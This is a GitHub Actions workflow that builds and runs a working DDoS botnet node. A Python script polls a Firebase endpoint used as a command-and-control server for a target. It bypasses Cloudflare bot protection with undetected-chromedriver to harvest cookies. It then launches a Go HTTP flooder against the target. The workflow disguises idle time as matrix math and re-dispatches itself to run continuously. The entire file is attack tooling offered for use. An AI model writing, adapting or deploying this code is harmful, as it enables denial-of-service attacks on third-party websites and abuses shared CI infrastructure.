name: Ryxen-Nexus-V2
on:
  workflow_dispatch:

jobs:
  heavy-attack:
    runs-on: ubuntu-latest
    steps:
    - name: Setup Tools
      run: |
        sudo apt-get update
        sudo apt-get install -y golang-go google-chrome-stable xvfb
        pip install requests undetected-chromedriver selenium numpy

    - name: Create Engine
      run: |
        cat <<EOF > engine.py
        import requests, time, random, subprocess, numpy as np
        import undetected_chromedriver as uc

        FB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"

        def get_keys(url):
            print("üîç Saltando Cloudflare con Selenium...")
            opts = uc.ChromeOptions()
            opts.add_argument('--headless')
            try:
                driver = uc.Chrome(options=opts)
                driver.get(url)
                time.sleep(15) # Espera el bypass autom√°tico
                cookie = "; ".join([f"{c['name']}={c['value']}" for c in driver.get_cookies()])
                ua = driver.execute_script("return navigator.userAgent")
                driver.quit()
                return cookie, ua
            except: return None, None

        if __name__ == "__main__":
            while True:
                try:
                    res = requests.get(FB_URL).json()
                    if res and res.get("status") == "attack":
                        target, dur = res.get("target"), res.get("time", 90)
                        cookie, ua = get_keys(target)
                        if cookie:
                            print(f"üî• Iniciando Flood masivo contra {target}")
                            subprocess.run(["go", "run", "attack.go", target, str(dur), cookie, ua])
                        requests.patch(FB_URL, json={"status": "idle"})
                    else:
                        # Camuflaje matem√°tico
                        np.random.rand(500, 500) @ np.random.rand(500, 500)
                except: pass
                time.sleep(30)
        EOF

    - name: Create Go Masive
      run: |
        cat <<EOF > attack.go
        package main
        import ("net/http"; "os"; "strconv"; "time")

        func main() {
            target, durStr, cookie, ua := os.Args[1], os.Args[2], os.Args[3], os.Args[4]
            dur, _ := strconv.Atoi(durStr)
            
            end := time.After(time.Duration(dur) * time.Second)
            for {
                select {
                case <-end: return
                default:
                    go func() {
                        req, _ := http.NewRequest("GET", target, nil)
                        req.Header.Set("Cookie", cookie)
                        req.Header.Set("User-Agent", ua)
                        client := &http.Client{Timeout: 5*time.Second}
                        resp, _ := client.Do(req)
                        if resp != nil { resp.Body.Close() }
                    }()
                    time.Sleep(2 * time.Millisecond)
                }
            }
        }
        EOF

    - name: Run 24/7
      run: |
        python engine.py &
        sleep 18000
        gh workflow run main.yml
      env:
        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

